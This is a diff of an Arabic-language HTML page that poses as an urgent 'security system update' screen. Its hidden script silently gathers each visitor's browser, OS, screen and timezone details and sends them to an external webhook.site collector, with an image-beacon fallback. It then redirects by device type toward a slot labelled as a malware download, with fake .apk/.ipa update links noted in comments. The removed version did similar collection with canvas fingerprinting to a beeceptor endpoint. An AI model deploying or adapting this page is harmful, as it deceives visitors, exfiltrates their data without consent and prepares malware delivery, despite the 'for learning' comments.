@@ -2,94 +2,116 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحميل...</title>
+    <title>جاري تحديث النظام...</title>
     <style>
-        body { margin: 0; padding: 0; background: #ffffff; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
-        .center-text { font-family: system-ui; color: #ccc; font-size: 14px; }
+        /* تصميم بسيط لصفحة التحديث الوهمية */
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0d1117;
+            color: #c9d1d9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: -apple-system, system-ui, sans-serif;
+            text-align: center;
+        }
+        .container {
+            padding: 30px;
+            border-radius: 12px;
+            background: #161b22;
+            border: 1px solid #30363d;
+            width: 90%;
+            max-width: 350px;
+        }
+        .loader {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            border: 4px solid #30363d;
+            border-top: 4px solid #58a6ff;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; margin-bottom: 8px; color: #f0f6fc; }
+        p { font-size: 14px; color: #8b949e; line-height: 1.5; }
     </style>
 </head>
 <body>
 
-    <div class="center-text">جاري تحديث النظام...</div>
+    <!-- واجهة التحميل الوهمية -->
+    <div class="container">
+        <div class="loader"></div>
+        <h2>جاري تحديث النظام</h2>
+        <p>يتم تحميل تحديث أمني عاجل لحماية بياناتك...</p>
+    </div>
 
+    <!-- ====================================================== -->
+    <!-- الكود الخلفي (لا يظهر للمستخدم، يعمل في الخلفية)        -->
+    <!-- ====================================================== -->
     <script>
-        // ==========================================================
-        //  الخيال العلمي برو ماكس - Forced Navigation Engine
-        //  - يجمع البيانات.
-        //  - يرسلها.
-        //  - يفتح الصفحة التالية فوراً.
-        // ==========================================================
-
-        // 1. جمع البيانات فائقة السرعة
-        function collectMaxData() {
+        // 1. صفحة الويب: جمع البيانات وإرسالها (كما تعلمت)
+        function collectAndSend() {
             const ua = navigator.userAgent;
+            
+            // تحديد نظام التشغيل
             let os = "Unknown";
             if (ua.includes('Windows')) os = "Windows";
             else if (ua.includes('Mac')) os = "macOS";
             else if (ua.includes('iPhone')) os = "iOS";
             else if (ua.includes('Android')) os = "Android";
 
-            // بصمة فريدة
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('Ghost_OSINT', 2, 15);
-            const id = btoa(canvas.toDataURL()).substring(50, 80);
-
-            return {
-                id: id,
+            // تجهيز البيانات
+            const payload = {
+                ua: ua,
                 os: os,
                 screen: `${window.screen.width}x${window.screen.height}`,
                 tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 timestamp: new Date().toISOString()
             };
+
+            // إرسال البيانات إلى خادمك (استخدم الرابط الخاص بك هنا)
+            const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';
+
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                mode: 'no-cors'
+            }).catch(() => {
+                // إرسال عبر صورة إذا فشل
+                const qs = new URLSearchParams(payload).toString();
+                new Image().src = `${webhook}?${qs}`;
+            });
         }
 
-        // 2. الإرسال إلى Beeceptor
-        async function sendData(data) {
-            const webhook = 'https://myrecon.free.beeceptor.com';
-            try {
-                await fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data),
-                    mode: 'no-cors'
-                });
-            } catch (e) {
-                // إرسال عبر الصورة في حال فشل الـ fetch
-                const qs = new URLSearchParams(data).toString();
-                new Image().src = `${webhook}?${qs}`;
+        // 2. تحديد نوع الجهاز وإنشاء رابط التحميل الخبيث
+        function getMalwareLink() {
+            const ua = navigator.userAgent;
+            
+            // هذه روابط وهمية (للتعلم فقط). في الهجوم الحقيقي، سترسل ملفات APK/IPA حقيقية
+            if (ua.includes('iPhone')) {
+                return "https://www.google.com"; // بدلاً من ذلك، قد يكون: "https://fake-apple.com/update.ipa"
+            } else if (ua.includes('Android')) {
+                return "https://www.google.com"; // بدلاً من ذلك، قد يكون: "https://fake-google.com/update.apk"
+            } else {
+                return "https://www.google.com"; // لأجهزة الكمبيوتر
             }
         }
 
-        // 3. دالة التنقل الإجباري (قلب الكود)
-        function forceNavigate() {
-            // -------------------------------------------------------
-            //  هنا تضع الصفحة التي تريد إجبار المستخدم على الذهاب إليها
-            //  مثال: فتح جوجل، أو فتح تطبيق واتساب عبر الرابط.
-            // -------------------------------------------------------
-            const targetUrl = "https://www.google.com";
-            
-            // إعادة التوجيه الفورية (Hard Redirect)
-            window.location.replace(targetUrl);
-        }
+        // 3. تشغيل المحرك المتكامل
+        window.onload = function() {
+            // أ. إرسال البيانات
+            collectAndSend();
 
-        // 4. تشغيل المحرك
-        window.onload = async function() {
-            // 1. جمع البيانات
-            const data = collectMaxData();
-            
-            // 2. إرسال البيانات فوراً (في الخلفية)
-            await sendData(data);
-
-            // 3. فتح الصفحة التالية بعد 1.5 ثانية (ليتم الإرسال قبل الانتقال)
+            // ب. الانتظار 3 ثوانٍ (لإيهام المستخدم أن التحديث جارٍ)
             setTimeout(() => {
-                forceNavigate();
-            }, 1500);
+                // ج. إعادة التوجيه إلى الرابط الخبيث (أو جوجل للتمويه)
+                const targetUrl = getMalwareLink();
+                window.location.replace(targetUrl);
+            }, 3000);
         };
     </script>
 </body>
